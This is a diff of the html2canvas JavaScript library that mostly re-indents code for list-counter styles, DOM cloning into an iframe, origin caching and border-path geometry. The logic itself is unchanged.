-		return createCJKCounter(value, '零一二三四五六七八九', '十百千萬', KOREAN_NEGATIVE, koreanSuffix, 0);
+  		return createCJKCounter(value, '零一二三四五六七八九', '十百千萬', KOREAN_NEGATIVE, koreanSuffix, 0);
             case 32 /* KOREAN_HANJA_FORMAL */:
-		return createCJKCounter(value, '零壹貳參四五六七八九', '拾百千', KOREAN_NEGATIVE, koreanSuffix, CJK_ZEROS | CJK_TEN_COEFFICIENTS | CJK_TEN_HIGH_COEFFICIENTS);
+  		return createCJKCounter(value, '零壹貳參四五六七八九', '拾百千', KOREAN_NEGATIVE, koreanSuffix, CJK_ZEROS | CJK_TEN_COEFFICIENTS | CJK_TEN_HIGH_COEFFICIENTS);
             case 18 /* DEVANAGARI */:
-		return createCounterStyleFromRange(value, 0x966, 0x96f, true, defaultSuffix);
+  		return createCounterStyleFromRange(value, 0x966, 0x96f, true, defaultSuffix);
             case 20 /* GEORGIAN */:
                 return createAdditiveCounter(value, 1, 19999, GEORGIAN, 3 /* DECIMAL */, defaultSuffix);
             case 21 /* GUJARATI */:
-		return createCounterStyleFromRange(value, 0xae6, 0xaef, true, defaultSuffix);
+  		return createCounterStyleFromRange(value, 0xae6, 0xaef, true, defaultSuffix);
             case 22 /* GURMUKHI */:
-		return createCounterStyleFromRange(value, 0xa66, 0xa6f, true, defaultSuffix);
+  		return createCounterStyleFromRange(value, 0xa66, 0xa6f, true, defaultSuffix);
             case 22 /* HEBREW */:
                 return createAdditiveCounter(value, 1, 10999, HEBREW, 3 /* DECIMAL */, defaultSuffix);
             case 23 /* HIRAGANA */:
-		return createCounterStyleFromSymbols(value, 'あいうえおかきくけこさしすせそたちつてとなにぬねのはひふへほまみむめもやゆよらりるれろわゐゑをん');
+  		return createCounterStyleFromSymbols(value, 'あいうえおかきくけこさしすせそたちつてとなにぬねのはひふへほまみむめもやゆよらりるれろわゐゑをん');
             case 24 /* HIRAGANA_IROHA */:
-		return createCounterStyleFromSymbols(value, 'いろはにほへとちりぬるをわかよたれそつねならむうゐのおくやまけふこえてあさきゆめみしゑひもせす');
+  		return createCounterStyleFromSymbols(value, 'いろはにほへとちりぬるをわかよたれそつねならむうゐのおくやまけふこえてあさきゆめみしゑひもせす');
             case 27 /* KANNADA */:
-		return createCounterStyleFromRange(value, 0xce6, 0xcef, true, defaultSuffix);
+  		return createCounterStyleFromRange(value, 0xce6, 0xcef, true, defaultSuffix);
             case 28 /* KATAKANA */:
-		return createCounterStyleFromSymbols(value, 'アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヰヱヲン', cjkSuffix);
+  		return createCounterStyleFromSymbols(value, 'アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヰヱヲン', cjkSuffix);
             case 29 /* KATAKANA_IROHA */:
-		return createCounterStyleFromSymbols(value, 'イロハニホヘトチリヌルヲワカヨタレソツネナラムウヰノオクヤマケフコエテアサキユメミシヱヒモセス', cjkSuffix);
+  		return createCounterStyleFromSymbols(value, 'イロハニホヘトチリヌルヲワカヨタレソツネナラムウヰノオクヤマケフコエテアサキユメミシヱヒモセス', cjkSuffix);
             case 34 /* LAO */:
-		return createCounterStyleFromRange(value, 0xed0, 0xed9, true, defaultSuffix);
+  		return createCounterStyleFromRange(value, 0xed0, 0xed9, true, defaultSuffix);
             case 37 /* MONGOLIAN */:
-		return createCounterStyleFromRange(value, 0x1810, 0x1819, true, defaultSuffix);
+  		return createCounterStyleFromRange(value, 0x1810, 0x1819, true, defaultSuffix);
             case 38 /* MYANMAR */:
-		return createCounterStyleFromRange(value, 0x1040, 0x1049, true, defaultSuffix);
+  		return createCounterStyleFromRange(value, 0x1040, 0x1049, true, defaultSuffix);
             case 39 /* ORIYA */:
-		return createCounterStyleFromRange(value, 0xb66, 0xb6f, true, defaultSuffix);
+  		return createCounterStyleFromRange(value, 0xb66, 0xb6f, true, defaultSuffix);
             case 40 /* PERSIAN */:
-		return createCounterStyleFromRange(value, 0x6f0, 0x6f9, true, defaultSuffix);
+  		return createCounterStyleFromRange(value, 0x6f0, 0x6f9, true, defaultSuffix);
             case 43 /* TAMIL */:
-		return createCounterStyleFromRange(value, 0xbe6, 0xbef, true, defaultSuffix);
+  		return createCounterStyleFromRange(value, 0xbe6, 0xbef, true, defaultSuffix);
             case 44 /* TELUGU */:
-		return createCounterStyleFromRange(value, 0xc66, 0xc6f, true, defaultSuffix);
+  		return createCounterStyleFromRange(value, 0xc66, 0xc6f, true, defaultSuffix);
             case 45 /* THAI */:
-		return createCounterStyleFromRange(value, 0xe50, 0xe59, true, defaultSuffix);
+  		return createCounterStyleFromRange(value, 0xe50, 0xe59, true, defaultSuffix);
             case 46 /* TIBETAN */:
-		return createCounterStyleFromRange(value, 0xf20, 0xf29, true, defaultSuffix);
+  		return createCounterStyleFromRange(value, 0xf20, 0xf29, true, defaultSuffix);
             case 3 /* DECIMAL */:
-	default:
-		return createCounterStyleFromRange(value, 48, 57, true, defaultSuffix);
-	}
-};
+  	default:
+  		return createCounterStyleFromRange(value, 48, 57, true, defaultSuffix);
+  	}
+  };
 
-var IGNORE_ATTRIBUTE = 'data-html2canvas-ignore';
+  var IGNORE_ATTRIBUTE = 'data-html2canvas-ignore';
     var DocumentCloner = /** @class */ (function () {
-function DocumentCloner(context, element, options) {
-	this.context = context;
-	this.options = options;
-	this.scrolledElements = [];
-	this.referenceElement = element;
-	this.counters = new CounterState();
-	this.quoteDepth = 0;
-	if (!element.ownerDocument) {
-		throw new Error('Cloned element does not have an owner document');
-	}
-	this.documentElement = this.cloneNode(element.ownerDocument.documentElement, false);
-}
-DocumentCloner.prototype.toIFrame = function (ownerDocument, windowSize) {
-	var _this = this;
-	var iframe = createIFrameContainer(ownerDocument, windowSize);
-	if (!iframe.contentWindow) {
-		return Promise.reject("Unable to find iframe window");
-	}
-	var scrollX = ownerDocument.defaultView.pageXOffset;
-	var scrollY = ownerDocument.defaultView.pageYOffset;
-	var cloneWindow = iframe.contentWindow;
-	var documentClone = cloneWindow.document;
+  function DocumentCloner(context, element, options) {
+  	this.context = context;
+  	this.options = options;
+  	this.scrolledElements = [];
+  	this.referenceElement = element;
+  	this.counters = new CounterState();
+  	this.quoteDepth = 0;
+  	if (!element.ownerDocument) {
+  		throw new Error('Cloned element does not have an owner document');
+  	}
+  	this.documentElement = this.cloneNode(element.ownerDocument.documentElement, false);
+  }
+  DocumentCloner.prototype.toIFrame = function (ownerDocument, windowSize) {
+  	var _this = this;
+  	var iframe = createIFrameContainer(ownerDocument, windowSize);
+  	if (!iframe.contentWindow) {
+  		return Promise.reject("Unable to find iframe window");
+  	}
+  	var scrollX = ownerDocument.defaultView.pageXOffset;
+  	var scrollY = ownerDocument.defaultView.pageYOffset;
+  	var cloneWindow = iframe.contentWindow;
+  	var documentClone = cloneWindow.document;
             /* Chrome doesn't detect relative background-images assigned in inline <style> sheets when fetched through getComputedStyle
              if window url is about:blank, we can assign the url to current by writing onto the document
              */
-	var iframeLoad = iframeLoader(iframe).then(function () { return __awaiter(_this, void 0, void 0, function () {
-		var onclone, referenceElement;
-		return __generator(this, function (_a) {
-			switch (_a.label) {
-			case 0:
-				this.scrolledElements.forEach(restoreNodeScroll);
-				if (cloneWindow) {
-					cloneWindow.scrollTo(windowSize.left, windowSize.top);
-					if (/(iPad|iPhone|iPod)/g.test(navigator.userAgent) &&
-						(cloneWindow.scrollY !== windowSize.top || cloneWindow.scrollX !== windowSize.left)) {
-						this.context.logger.warn('Unable to restore scroll position for cloned document');
-					this.context.windowBounds = this.context.windowBounds.add(cloneWindow.scrollX - windowSize.left, cloneWindow.scrollY - windowSize.top, 0, 0);
-				}
-			}
-			onclone = this.options.onclone;
-			referenceElement = this.clonedReferenceElement;
-			if (typeof referenceElement === 'undefined') {
+  	var iframeLoad = iframeLoader(iframe).then(function () { return __awaiter(_this, void 0, void 0, function () {
+  		var onclone, referenceElement;
+  		return __generator(this, function (_a) {
+  			switch (_a.label) {
+  			case 0:
+  				this.scrolledElements.forEach(restoreNodeScroll);
+  				if (cloneWindow) {
+  					cloneWindow.scrollTo(windowSize.left, windowSize.top);
+  					if (/(iPad|iPhone|iPod)/g.test(navigator.userAgent) &&
+  						(cloneWindow.scrollY !== windowSize.top || cloneWindow.scrollX !== windowSize.left)) {
+  						this.context.logger.warn('Unable to restore scroll position for cloned document');
+  					this.context.windowBounds = this.context.windowBounds.add(cloneWindow.scrollX - windowSize.left, cloneWindow.scrollY - windowSize.top, 0, 0);
+  				}
+  			}
+  			onclone = this.options.onclone;
+  			referenceElement = this.clonedReferenceElement;
+  			if (typeof referenceElement === 'undefined') {
                                 return [2 /*return*/, Promise.reject("Error finding the " + this.referenceElement.nodeName + " in the cloned document")];
-			}
+  			}
                             if (!(documentClone.fonts && documentClone.fonts.ready)) return [3 /*break*/, 2];
                             return [4 /*yield*/, documentClone.fonts.ready];
-		case 1:
-			_a.sent();
-			_a.label = 2;
-		case 2:
+  		case 1:
+  			_a.sent();
+  			_a.label = 2;
+  		case 2:
                             if (!/(AppleWebKit)/g.test(navigator.userAgent)) return [3 /*break*/, 4];
                             return [4 /*yield*/, imagesReady(documentClone)];
-		case 3:
-			_a.sent();
-			_a.label = 4;
-		case 4:
-			if (typeof onclone === 'function') {
+  		case 3:
+  			_a.sent();
+  			_a.label = 4;
+  		case 4:
+  			if (typeof onclone === 'function') {
                                 return [2 /*return*/, Promise.resolve()
-				.then(function () { return onclone(documentClone, referenceElement); })
-				.then(function () { return iframe; })];
-                            }
+  				.then(function () { return onclone(documentClone, referenceElement); })
+  				.then(function () { return iframe; })];
+  			}
                             return [2 /*return*/, iframe];
-                        }
-                    });
-	}); });
-	documentClone.open();
-	documentClone.write(serializeDoctype(document.doctype) + "<html></html>");
+  		}
+  	});
+  	}); });
+  	documentClone.open();
+  	documentClone.write(serializeDoctype(document.doctype) + "<html></html>");
             // Chrome scrolls the parent document for some reason after the write to the cloned window???
-	restoreOwnerScroll(this.referenceElement.ownerDocument, scrollX, scrollY);
-	documentClone.replaceChild(documentClone.adoptNode(this.documentElement), documentClone.documentElement);
-	documentClone.close();
-	return iframeLoad;
-};
-DocumentCloner.prototype.createElementClone = function (node) {
+  	restoreOwnerScroll(this.referenceElement.ownerDocument, scrollX, scrollY);
+  	documentClone.replaceChild(documentClone.adoptNode(this.documentElement), documentClone.documentElement);
+  	documentClone.close();
+  	return iframeLoad;
+  };
+  DocumentCloner.prototype.createElementClone = function (node) {
             if (isDebugging(node, 2 /* CLONE */)) {
-	debugger;
-}
-if (isCanvasElement(node)) {
-	return this.createCanvasClone(node);
-}
-if (isVideoElement(node)) {
-	return this.createVideoClone(node);
-}
-if (isStyleElement(node)) {
-	return this.createStyleClone(node);
-}
-var clone = node.cloneNode(false);
-if (isImageElement(clone)) {
-	if (isImageElement(node) && node.currentSrc && node.currentSrc !== node.src) {
-		clone.src = node.currentSrc;
-		clone.srcset = '';
-	}
-	if (clone.loading === 'lazy') {
-		clone.loading = 'eager';
-	}
-}
-if (isCustomElement(clone)) {
-	return this.createCustomElementClone(clone);
-}
-return clone;
+  	debugger;
+  }
+  if (isCanvasElement(node)) {
+  	return this.createCanvasClone(node);
+  }
+  if (isVideoElement(node)) {
+  	return this.createVideoClone(node);
+  }
+  if (isStyleElement(node)) {
+  	return this.createStyleClone(node);
+  }
+  var clone = node.cloneNode(false);
+  if (isImageElement(clone)) {
+  	if (isImageElement(node) && node.currentSrc && node.currentSrc !== node.src) {
+  		clone.src = node.currentSrc;
+  		clone.srcset = '';
+  	}
+  	if (clone.loading === 'lazy') {
+  		clone.loading = 'eager';
+  	}
+  }
+  if (isCustomElement(clone)) {
+  	return this.createCustomElementClone(clone);
+  }
+  return clone;
 };
 DocumentCloner.prototype.createCustomElementClone = function (node) {
 	var clone = document.createElement('html2canvascustomelement');
@@ -7022,128 +7504,128 @@ var createIFrameContainer = function (ownerDocument, bounds) {
         cloneIframeContainer.setAttribute(IGNORE_ATTRIBUTE, 'true');
         ownerDocument.body.appendChild(cloneIframeContainer);
         return cloneIframeContainer;
-    };
-    var imageReady = function (img) {
-    	return new Promise(function (resolve) {
-    		if (img.complete) {
-    			resolve();
-    			return;
-    		}
-    		if (!img.src) {
-    			resolve();
-    			return;
-    		}
-    		img.onload = resolve;
-    		img.onerror = resolve;
-    	});
-    };
-    var imagesReady = function (document) {
-    	return Promise.all([].slice.call(document.images, 0).map(imageReady));
-    };
-    var iframeLoader = function (iframe) {
-    	return new Promise(function (resolve, reject) {
-    		var cloneWindow = iframe.contentWindow;
-    		if (!cloneWindow) {
-    			return reject("No window assigned for iframe");
-    		}
-    		var documentClone = cloneWindow.document;
-    		cloneWindow.onload = iframe.onload = function () {
-    			cloneWindow.onload = iframe.onload = null;
-    			var interval = setInterval(function () {
-    				if (documentClone.body.childNodes.length > 0 && documentClone.readyState === 'complete') {
-    					clearInterval(interval);
-    					resolve(iframe);
-    				}
-    			}, 50);
-    		};
-    	});
-    };
-    var ignoredStyleProperties = [
-    	'all',
-    	'd',
+      };
+      var imageReady = function (img) {
+      	return new Promise(function (resolve) {
+      		if (img.complete) {
+      			resolve();
+      			return;
+      		}
+      		if (!img.src) {
+      			resolve();
+      			return;
+      		}
+      		img.onload = resolve;
+      		img.onerror = resolve;
+      	});
+      };
+      var imagesReady = function (document) {
+      	return Promise.all([].slice.call(document.images, 0).map(imageReady));
+      };
+      var iframeLoader = function (iframe) {
+      	return new Promise(function (resolve, reject) {
+      		var cloneWindow = iframe.contentWindow;
+      		if (!cloneWindow) {
+      			return reject("No window assigned for iframe");
+      		}
+      		var documentClone = cloneWindow.document;
+      		cloneWindow.onload = iframe.onload = function () {
+      			cloneWindow.onload = iframe.onload = null;
+      			var interval = setInterval(function () {
+      				if (documentClone.body.childNodes.length > 0 && documentClone.readyState === 'complete') {
+      					clearInterval(interval);
+      					resolve(iframe);
+      				}
+      			}, 50);
+      		};
+      	});
+      };
+      var ignoredStyleProperties = [
+      	'all',
+      	'd',
         'content' // Safari shows pseudoelements if content is set
-        ];
-    var copyCSSStyles = function (style, target) {
+      ];
+      var copyCSSStyles = function (style, target) {
         // Edge does not provide value for cssText
-    	for (var i = style.length - 1; i >= 0; i--) {
-    		var property = style.item(i);
-    		if (ignoredStyleProperties.indexOf(property) === -1) {
-    			target.style.setProperty(property, style.getPropertyValue(property));
-    		}
-    	}
-    	return target;
+      	for (var i = style.length - 1; i >= 0; i--) {
+      		var property = style.item(i);
+      		if (ignoredStyleProperties.indexOf(property) === -1) {
+      			target.style.setProperty(property, style.getPropertyValue(property));
+      		}
+      	}
+      	return target;
+      };
+      var serializeDoctype = function (doctype) {
+      	var str = '';
+      	if (doctype) {
+      		str += '<!DOCTYPE ';
+      		if (doctype.name) {
+      			str += doctype.name;
+      		}
+      		if (doctype.internalSubset) {
+      			str += doctype.internalSubset;
+      		}
+      		if (doctype.publicId) {
+      			str += "\"" + doctype.publicId + "\"";
+      		}
+      		if (doctype.systemId) {
+      			str += "\"" + doctype.systemId + "\"";
+      		}
+      		str += '>';
+      	}
+      	return str;
+      };
+      var restoreOwnerScroll = function (ownerDocument, x, y) {
+      	if (ownerDocument &&
+      		ownerDocument.defaultView &&
+      		(x !== ownerDocument.defaultView.pageXOffset || y !== ownerDocument.defaultView.pageYOffset)) {
+      		ownerDocument.defaultView.scrollTo(x, y);
+      }
     };
-    var serializeDoctype = function (doctype) {
-    	var str = '';
-    	if (doctype) {
-    		str += '<!DOCTYPE ';
-    		if (doctype.name) {
-    			str += doctype.name;
-    		}
-    		if (doctype.internalSubset) {
-    			str += doctype.internalSubset;
-    		}
-    		if (doctype.publicId) {
-    			str += "\"" + doctype.publicId + "\"";
-    		}
-    		if (doctype.systemId) {
-    			str += "\"" + doctype.systemId + "\"";
-    		}
-    		str += '>';
-    	}
-    	return str;
+    var restoreNodeScroll = function (_a) {
+    	var element = _a[0], x = _a[1], y = _a[2];
+    	element.scrollLeft = x;
+    	element.scrollTop = y;
     };
-    var restoreOwnerScroll = function (ownerDocument, x, y) {
-    	if (ownerDocument &&
-    		ownerDocument.defaultView &&
-    		(x !== ownerDocument.defaultView.pageXOffset || y !== ownerDocument.defaultView.pageYOffset)) {
-    		ownerDocument.defaultView.scrollTo(x, y);
-    }
-};
-var restoreNodeScroll = function (_a) {
-	var element = _a[0], x = _a[1], y = _a[2];
-	element.scrollLeft = x;
-	element.scrollTop = y;
-};
-var PSEUDO_BEFORE = ':before';
-var PSEUDO_AFTER = ':after';
-var PSEUDO_HIDE_ELEMENT_CLASS_BEFORE = '___html2canvas___pseudoelement_before';
-var PSEUDO_HIDE_ELEMENT_CLASS_AFTER = '___html2canvas___pseudoelement_after';
-var PSEUDO_HIDE_ELEMENT_STYLE = "{\n    content: \"\" !important;\n    display: none !important;\n}";
-var createPseudoHideStyles = function (body) {
-	createStyles(body, "." + PSEUDO_HIDE_ELEMENT_CLASS_BEFORE + PSEUDO_BEFORE + PSEUDO_HIDE_ELEMENT_STYLE + "\n         ." + PSEUDO_HIDE_ELEMENT_CLASS_AFTER + PSEUDO_AFTER + PSEUDO_HIDE_ELEMENT_STYLE);
-};
-var createStyles = function (body, styles) {
-	var document = body.ownerDocument;
-	if (document) {
-		var style = document.createElement('style');
-		style.textContent = styles;
-		body.appendChild(style);
-	}
-};
+    var PSEUDO_BEFORE = ':before';
+    var PSEUDO_AFTER = ':after';
+    var PSEUDO_HIDE_ELEMENT_CLASS_BEFORE = '___html2canvas___pseudoelement_before';
+    var PSEUDO_HIDE_ELEMENT_CLASS_AFTER = '___html2canvas___pseudoelement_after';
+    var PSEUDO_HIDE_ELEMENT_STYLE = "{\n    content: \"\" !important;\n    display: none !important;\n}";
+    var createPseudoHideStyles = function (body) {
+    	createStyles(body, "." + PSEUDO_HIDE_ELEMENT_CLASS_BEFORE + PSEUDO_BEFORE + PSEUDO_HIDE_ELEMENT_STYLE + "\n         ." + PSEUDO_HIDE_ELEMENT_CLASS_AFTER + PSEUDO_AFTER + PSEUDO_HIDE_ELEMENT_STYLE);
+    };
+    var createStyles = function (body, styles) {
+    	var document = body.ownerDocument;
+    	if (document) {
+    		var style = document.createElement('style');
+    		style.textContent = styles;
+    		body.appendChild(style);
+    	}
+    };
 
     var CacheStorage = /** @class */ (function () {
-function CacheStorage() {
-}
-CacheStorage.getOrigin = function (url) {
-	var link = CacheStorage._link;
-	if (!link) {
-		return 'about:blank';
-	}
-	link.href = url;
+    function CacheStorage() {
+    }
+    CacheStorage.getOrigin = function (url) {
+    	var link = CacheStorage._link;
+    	if (!link) {
+    		return 'about:blank';
+    	}
+    	link.href = url;
             link.href = link.href; // IE9, LOL! - http://jsfiddle.net/niklasvh/2e48b/
             return link.protocol + link.hostname + link.port;
-        };
-        CacheStorage.isSameOrigin = function (src) {
-        	return CacheStorage.getOrigin(src) === CacheStorage._origin;
-        };
-        CacheStorage.setContext = function (window) {
-        	CacheStorage._link = window.document.createElement('a');
-        	CacheStorage._origin = CacheStorage.getOrigin(window.location.href);
-        };
-        CacheStorage._origin = 'about:blank';
-        return CacheStorage;
-    }());
+          };
+          CacheStorage.isSameOrigin = function (src) {
+          	return CacheStorage.getOrigin(src) === CacheStorage._origin;
+          };
+          CacheStorage.setContext = function (window) {
+          	CacheStorage._link = window.document.createElement('a');
+          	CacheStorage._origin = CacheStorage.getOrigin(window.location.href);
+          };
+          CacheStorage._origin = 'about:blank';
+          return CacheStorage;
+        }());
     var Cache = /** @class */ (function () {
     function Cache(context, _options) {
     	this.context = context;
@@ -7217,8 +7699,8 @@ CacheStorage.getOrigin = function (url) {
     			}
     		})];
                         case 3: return [2 /*return*/, _a.sent()];
-                        }
-                    });
+                          }
+                        });
     	});
     };
     Cache.prototype.has = function (key) {
@@ -7268,7 +7750,7 @@ CacheStorage.getOrigin = function (url) {
     	});
     };
     return Cache;
-}());
+  }());
 var INLINE_SVG = /^data:image\/svg\+xml/i;
 var INLINE_BASE64 = /^data:image\/.*;base64,/i;
     var INLINE_IMG = /^data:image\/.*/i;
@@ -7317,7 +7799,7 @@ return Vector;
     	return new BezierCurve(this.end, this.endControl, this.startControl, this.start);
     };
     return BezierCurve;
-}());
+  }());
     var isBezierCurve = function (path) { return path.type === 1 /* BEZIER_CURVE */; };
 
     var BoundCurves = /** @class */ (function () {
@@ -7454,7 +7936,7 @@ return Vector;
     	: new Vector(bounds.left + borderLeftWidth + paddingLeft, bounds.top + bounds.height - (borderBottomWidth + paddingBottom));
     }
     return BoundCurves;
-}());
+  }());
 var CORNER;
 (function (CORNER) {
 	CORNER[CORNER["TOP_LEFT"] = 0] = "TOP_LEFT";
@@ -7479,37 +7961,37 @@ var getCurvePoints = function (x, y, r1, r2, position) {
         default:
         	return new BezierCurve(new Vector(xm, ym), new Vector(xm - ox, ym), new Vector(x, y + oy), new Vector(x, y));
         }
-    };
-    var calculateBorderBoxPath = function (curves) {
-    	return [curves.topLeftBorderBox, curves.topRightBorderBox, curves.bottomRightBorderBox, curves.bottomLeftBorderBox];
-    };
-    var calculateContentBoxPath = function (curves) {
-    	return [
-    		curves.topLeftContentBox,
-    		curves.topRightContentBox,
-    		curves.bottomRightContentBox,
-    		curves.bottomLeftContentBox
-    		];
-    };
-    var calculatePaddingBoxPath = function (curves) {
-    	return [
-    		curves.topLeftPaddingBox,
-    		curves.topRightPaddingBox,
-    		curves.bottomRightPaddingBox,
-    		curves.bottomLeftPaddingBox
-    		];
-    };
+      };
+      var calculateBorderBoxPath = function (curves) {
+      	return [curves.topLeftBorderBox, curves.topRightBorderBox, curves.bottomRightBorderBox, curves.bottomLeftBorderBox];
+      };
+      var calculateContentBoxPath = function (curves) {
+      	return [
+      		curves.topLeftContentBox,
+      		curves.topRightContentBox,
+      		curves.bottomRightContentBox,
+      		curves.bottomLeftContentBox
+      	];
+      };
+      var calculatePaddingBoxPath = function (curves) {
+      	return [
+      		curves.topLeftPaddingBox,
+      		curves.topRightPaddingBox,
+      		curves.bottomRightPaddingBox,
+      		curves.bottomLeftPaddingBox
+      	];
+      };
 
     var TransformEffect = /** @class */ (function () {
-    function TransformEffect(offsetX, offsetY, matrix) {
-    	this.offsetX = offsetX;
-    	this.offsetY = offsetY;
-    	this.matrix = matrix;
+      function TransformEffect(offsetX, offsetY, matrix) {
+      	this.offsetX = offsetX;
+      	this.offsetY = offsetY;
+      	this.matrix = matrix;
             this.type = 0 /* TRANSFORM */;
             this.target = 2 /* BACKGROUND_BORDERS */ | 4 /* CONTENT */;
-    }
-    return TransformEffect;
-}());
+      }
+      return TransformEffect;
+    }());
     var ClipEffect = /** @class */ (function () {
     function ClipEffect(path, target) {
     	this.path = path;
@@ -7517,7 +7999,7 @@ var getCurvePoints = function (x, y, r1, r2, position) {
             this.type = 1 /* CLIP */;
     }
     return ClipEffect;
-}());
+  }());
     var OpacityEffect = /** @class */ (function () {
     function OpacityEffect(opacity) {
     	this.opacity = opacity;
@@ -7525,7 +8007,7 @@ var getCurvePoints = function (x, y, r1, r2, position) {
             this.target = 2 /* BACKGROUND_BORDERS */ | 4 /* CONTENT */;
     }
     return OpacityEffect;
-}());
+  }());
     var isTransformEffect = function (effect) {
         return effect.type === 0 /* TRANSFORM */;
     };
@@ -7566,7 +8048,7 @@ var getCurvePoints = function (x, y, r1, r2, position) {
     	this.nonPositionedInlineLevel = [];
     }
     return StackingContext;
-}());
+  }());
     var ElementPaint = /** @class */ (function () {
     function ElementPaint(container, parent) {
     	this.container = container;
@@ -7593,28 +8075,28 @@ var getCurvePoints = function (x, y, r1, r2, position) {
                     this.effects.push(new ClipEffect(paddingBox, 4 /* CONTENT */));
     	}
     }
-}
-ElementPaint.prototype.getEffects = function (target) {
+  }
+  ElementPaint.prototype.getEffects = function (target) {
             var inFlow = [2 /* ABSOLUTE */, 3 /* FIXED */].indexOf(this.container.styles.position) === -1;
-	var parent = this.parent;
-	var effects = this.effects.slice(0);
-	while (parent) {
-		var croplessEffects = parent.effects.filter(function (effect) { return !isClipEffect(effect); });
+  	var parent = this.parent;
+  	var effects = this.effects.slice(0);
+  	while (parent) {
+  		var croplessEffects = parent.effects.filter(function (effect) { return !isClipEffect(effect); });
                 if (inFlow || parent.container.styles.position !== 0 /* STATIC */ || !parent.parent) {
-		effects.unshift.apply(effects, croplessEffects);
+  		effects.unshift.apply(effects, croplessEffects);
                     inFlow = [2 /* ABSOLUTE */, 3 /* FIXED */].indexOf(parent.container.styles.position) === -1;
                     if (parent.container.styles.overflowX !== 0 /* VISIBLE */) {
-		var borderBox = calculateBorderBoxPath(parent.curves);
-		var paddingBox = calculatePaddingBoxPath(parent.curves);
-		if (!equalPath(borderBox, paddingBox)) {
+  		var borderBox = calculateBorderBoxPath(parent.curves);
+  		var paddingBox = calculatePaddingBoxPath(parent.curves);
+  		if (!equalPath(borderBox, paddingBox)) {
                             effects.unshift(new ClipEffect(paddingBox, 2 /* BACKGROUND_BORDERS */ | 4 /* CONTENT */));
-		}
-	}
-}
-else {
-	effects.unshift.apply(effects, croplessEffects);
-}
-parent = parent.parent;
+  		}
+  	}
+  }
+  else {
+  	effects.unshift.apply(effects, croplessEffects);
+  }
+  parent = parent.parent;
 }
 return effects.filter(function (effect) { return contains(effect.target, target); });
 };
@@ -7688,7 +8170,7 @@ return ElementPaint;
             if (contains(child.flags, 8 /* IS_LIST_OWNER */)) {
     	processListItems(child, listOwnerItems);
     }
-});
+  });
     };
     var processListItems = function (owner, elements) {
     	var numbering = owner instanceof OLElementContainer ? owner.start : 1;
@@ -7703,134 +8185,134 @@ return ElementPaint;
     	item.listValue = createCounterText(numbering, item.container.styles.listStyleType, true);
     	numbering += reversed ? -1 : 1;
     }
-};
-var parseStackingContexts = function (container) {
-	var paintContainer = new ElementPaint(container, null);
-	var root = new StackingContext(paintContainer);
-	var listItems = [];
-	parseStackTree(paintContainer, root, root, listItems);
-	processListItems(paintContainer.container, listItems);
-	return root;
-};
+  };
+  var parseStackingContexts = function (container) {
+  	var paintContainer = new ElementPaint(container, null);
+  	var root = new StackingContext(paintContainer);
+  	var listItems = [];
+  	parseStackTree(paintContainer, root, root, listItems);
+  	processListItems(paintContainer.container, listItems);
+  	return root;
+  };
 
-var parsePathForBorder = function (curves, borderSide) {
-	switch (borderSide) {
-	case 0:
-		return createPathFromCurves(curves.topLeftBorderBox, curves.topLeftPaddingBox, curves.topRightBorderBox, curves.topRightPaddingBox);
-	case 1:
-		return createPathFromCurves(curves.topRightBorderBox, curves.topRightPaddingBox, curves.bottomRightBorderBox, curves.bottomRightPaddingBox);
-	case 2:
-		return createPathFromCurves(curves.bottomRightBorderBox, curves.bottomRightPaddingBox, curves.bottomLeftBorderBox, curves.bottomLeftPaddingBox);
-	case 3:
-	default:
-		return createPathFromCurves(curves.bottomLeftBorderBox, curves.bottomLeftPaddingBox, curves.topLeftBorderBox, curves.topLeftPaddingBox);
-	}
-};
-var parsePathForBorderDoubleOuter = function (curves, borderSide) {
-	switch (borderSide) {
-	case 0:
-		return createPathFromCurves(curves.topLeftBorderBox, curves.topLeftBorderDoubleOuterBox, curves.topRightBorderBox, curves.topRightBorderDoubleOuterBox);
-	case 1:
-		return createPathFromCurves(curves.topRightBorderBox, curves.topRightBorderDoubleOuterBox, curves.bottomRightBorderBox, curves.bottomRightBorderDoubleOuterBox);
-	case 2:
-		return createPathFromCurves(curves.bottomRightBorderBox, curves.bottomRightBorderDoubleOuterBox, curves.bottomLeftBorderBox, curves.bottomLeftBorderDoubleOuterBox);
-	case 3:
-	default:
-		return createPathFromCurves(curves.bottomLeftBorderBox, curves.bottomLeftBorderDoubleOuterBox, curves.topLeftBorderBox, curves.topLeftBorderDoubleOuterBox);
-	}
-};
-var parsePathForBorderDoubleInner = function (curves, borderSide) {
-	switch (borderSide) {
-	case 0:
-		return createPathFromCurves(curves.topLeftBorderDoubleInnerBox, curves.topLeftPaddingBox, curves.topRightBorderDoubleInnerBox, curves.topRightPaddingBox);
-	case 1:
-		return createPathFromCurves(curves.topRightBorderDoubleInnerBox, curves.topRightPaddingBox, curves.bottomRightBorderDoubleInnerBox, curves.bottomRightPaddingBox);
-	case 2:
-		return createPathFromCurves(curves.bottomRightBorderDoubleInnerBox, curves.bottomRightPaddingBox, curves.bottomLeftBorderDoubleInnerBox, curves.bottomLeftPaddingBox);
-	case 3:
-	default:
-		return createPathFromCurves(curves.bottomLeftBorderDoubleInnerBox, curves.bottomLeftPaddingBox, curves.topLeftBorderDoubleInnerBox, curves.topLeftPaddingBox);
-	}
-};
-var parsePathForBorderStroke = function (curves, borderSide) {
-	switch (borderSide) {
-	case 0:
-		return createStrokePathFromCurves(curves.topLeftBorderStroke, curves.topRightBorderStroke);
-	case 1:
-		return createStrokePathFromCurves(curves.topRightBorderStroke, curves.bottomRightBorderStroke);
-	case 2:
-		return createStrokePathFromCurves(curves.bottomRightBorderStroke, curves.bottomLeftBorderStroke);
-	case 3:
-	default:
-		return createStrokePathFromCurves(curves.bottomLeftBorderStroke, curves.topLeftBorderStroke);
-	}
-};
-var createStrokePathFromCurves = function (outer1, outer2) {
-	var path = [];
-	if (isBezierCurve(outer1)) {
-		path.push(outer1.subdivide(0.5, false));
-	}
-	else {
-		path.push(outer1);
-	}
-	if (isBezierCurve(outer2)) {
-		path.push(outer2.subdivide(0.5, true));
-	}
-	else {
-		path.push(outer2);
-	}
-	return path;
-};
-var createPathFromCurves = function (outer1, inner1, outer2, inner2) {
-	var path = [];
-	if (isBezierCurve(outer1)) {
-		path.push(outer1.subdivide(0.5, false));
-	}
-	else {
-		path.push(outer1);
-	}
-	if (isBezierCurve(outer2)) {
-		path.push(outer2.subdivide(0.5, true));
-	}
-	else {
-		path.push(outer2);
-	}
